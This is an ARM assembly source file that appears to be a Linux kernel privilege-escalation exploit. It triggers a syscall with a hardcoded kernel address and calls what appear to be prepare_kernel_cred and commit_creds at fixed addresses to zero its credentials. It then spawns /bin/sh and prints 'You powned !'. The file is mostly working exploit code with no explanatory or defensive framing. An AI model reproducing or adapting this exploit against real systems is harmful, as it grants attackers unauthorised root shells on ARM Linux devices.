.section .text
.global _start
.code 32
_start:
    ldr r0, =string
    mov r1, #10
    bl write_r0_to_stdout
    //ldr r0, =whoami
    //bl exec_r0
    bl get_pc

branch:
    mov r7, #0xdf
    mov r0, #1
    mov r1, #42
    mov r2, lr
    ldr r3, =0x8000e860
    svc 0
    mov r7, #0xdf
    svc 0
    //ldr r0, =whoami
    //bl exec_r0
    ldr r0, =binsh
    bl exec_r0
    ldr r0, =string2
    mov r1, #17
    bl write_r0_to_stdout
    bl exit

exec_r0:
    mov r5, r0
    mov r0, #0
    push {r0}
    mov r0, r5
    push {r0}
    mov r1, sp
    sub r2, r2, r2
    mov r7, #11
    svc 0
    mov pc, lr

write_r0_to_stdout:
    MOV R7, #4
    MOV R2, R1
    MOV R1, R0
    MOV R0, #1
    SWI 0
    MOV PC, LR

exit:
    MOV R7, #1
    SWI 0

get_pc:
    bl branch

call_commit_creds_arm:
    push {lr}

    ldr r0, =string3
    mov r1, #13
    MOV R7, #4
    MOV R2, R1
    MOV R1, R0
    MOV R0, #1
    SVC 0

    sub r4, r4, r4
    mov r0, r4
    ldr r2, =0x800420c4
    blx r2

    push {r0}
    sub r1, r1, r1
    add r0, #4
    str r1, [r0], #4
    str r1, [r0], #4
    str r1, [r0], #4
    str r1, [r0], #4
    str r1, [r0], #4
    str r1, [r0], #4
    str r1, [r0], #4
    str r1, [r0], #4
    pop {r0}

    ldr r2, =0x80042148
    blx r2

    pop {pc}


.data
string:
    .ascii "Hey man !\n"
string2:
    .ascii "You not powned !\n"
string3:
    .ascii "You powned !\n"
whoami:
    .ascii "/usr/bin/whoami\x00"
binsh:
    .ascii "/bin/sh\x00"
arg:
    .ascii "/home/user/script.sh\x00"
filename:
    .ascii "/passwd/passwd\x00"
dir:
    .ascii "/home/user/lol\x00"
